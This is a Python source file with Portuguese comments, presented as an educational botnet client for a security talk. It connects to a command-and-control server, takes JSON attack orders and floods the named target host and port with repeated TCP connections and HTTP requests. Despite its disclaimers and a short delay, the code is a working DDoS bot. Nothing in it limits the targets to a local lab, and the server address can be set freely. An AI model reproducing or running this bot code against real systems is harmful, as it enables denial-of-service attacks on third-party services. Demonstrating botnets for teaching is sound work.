#!/usr/bin/env python3
"""
BOT EDUCACIONAL - APENAS PARA FINS DE DEMONSTRAÇÃO
==================================================
AVISO: Este código é apenas para fins educacionais e demonstração em palestras.
NÃO deve ser usado para atividades maliciosas ou ilegais.

Este bot simula um cliente que se conecta ao servidor C&C em uma demonstração
controlada e local.
"""

import socket
import json
import time
import threading
import random
import sys

class EducationalBot:
    def __init__(self, cc_host='127.0.0.1', cc_port=9999, bot_name=None):
        self.cc_host = cc_host
        self.cc_port = cc_port
        self.bot_name = bot_name or f"Bot-{random.randint(1000, 9999)}"
        self.connected = False
        self.attack_thread = None
        self.attack_active = False
        
    def connect(self):
        """Conecta ao servidor C&C"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.cc_host, self.cc_port))
            
            # Envia identificação
            bot_info = {
                'name': self.bot_name,
                'type': 'educational',
                'version': '1.0'
            }
            self.socket.send(json.dumps(bot_info).encode('utf-8'))
            
            self.connected = True
            print(f"[{self.bot_name}] Conectado ao C&C em {self.cc_host}:{self.cc_port}")
            
            return True
        except Exception as e:
            print(f"[{self.bot_name}] Erro ao conectar: {e}")
            return False
    
    def execute_attack(self, target_host, target_port, duration):
        """Executa um ataque DDoS simulado (apenas para demonstração)"""
        print(f"[{self.bot_name}] Iniciando ataque simulado para {target_host}:{target_port}")
        
        self.attack_active = True
        end_time = time.time() + duration
        request_count = 0
        
        while time.time() < end_time and self.attack_active:
            try:
                # Cria uma conexão TCP (simulação de requisição)
                attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                attack_socket.settimeout(1)
                
                try:
                    attack_socket.connect((target_host, target_port))
                    # Envia uma requisição simples
                    attack_socket.send(b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n")
                    request_count += 1
                except:
                    # Conexão falhou (normal em um ataque DDoS)
                    request_count += 1
                finally:
                    attack_socket.close()
                
                # Pequeno delay para não sobrecarregar o sistema
                time.sleep(0.1)
                
            except Exception as e:
                pass
        
        print(f"[{self.bot_name}] Ataque concluído. {request_count} requisições enviadas")
        self.attack_active = False
    
    def handle_command(self, command):
        """Processa comandos do servidor C&C"""
        if command['type'] == 'attack':
            if not self.attack_active:
                target_host = command['target']
                target_port = command['port']
                duration = command.get('duration', 10)
                
                # Inicia ataque em thread separada
                self.attack_thread = threading.Thread(
                    target=self.execute_attack,
                    args=(target_host, target_port, duration)
                )
                self.attack_thread.daemon = True
                self.attack_thread.start()
        
        elif command['type'] == 'idle':
            if self.attack_active:
                self.attack_active = False
                print(f"[{self.bot_name}] Ataque interrompido")
    
    def run(self):
        """Loop principal do bot"""
        if not self.connect():
            return
        
        try:
            while self.connected:
                try:
                    # Recebe comando do C&C
                    data = self.socket.recv(1024)
                    if not data:
                        break
                    
                    command = json.loads(data.decode('utf-8'))
                    self.handle_command(command)
                    
                    # Envia status de volta
                    status = {
                        'status': 'attacking' if self.attack_active else 'idle',
                        'bot_name': self.bot_name
                    }
                    self.socket.send(json.dumps(status).encode('utf-8'))
                    
                except socket.timeout:
                    continue
                except json.JSONDecodeError:
                    continue
                except Exception as e:
                    print(f"[{self.bot_name}] Erro: {e}")
                    break
                    
        except KeyboardInterrupt:
            print(f"\n[{self.bot_name}] Encerrando...")
        finally:
            self.connected = False
            if hasattr(self, 'socket'):
                self.socket.close()

def main():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║         BOT EDUCACIONAL - DEMONSTRAÇÃO DE SEGURANÇA      ║
    ╚══════════════════════════════════════════════════════════╝
    
    AVISO LEGAL:
    Este software é apenas para fins educacionais e demonstração.
    O uso deste software para atividades maliciosas é ilegal.
    
    """)
    
    # Permite especificar nome do bot via argumento
    bot_name = sys.argv[1] if len(sys.argv) > 1 else None
    cc_host = sys.argv[2] if len(sys.argv) > 2 else '127.0.0.1'
    cc_port = int(sys.argv[3]) if len(sys.argv) > 3 else 9999
    
    bot = EducationalBot(cc_host=cc_host, cc_port=cc_port, bot_name=bot_name)
    bot.run()

if __name__ == '__main__':
    main()

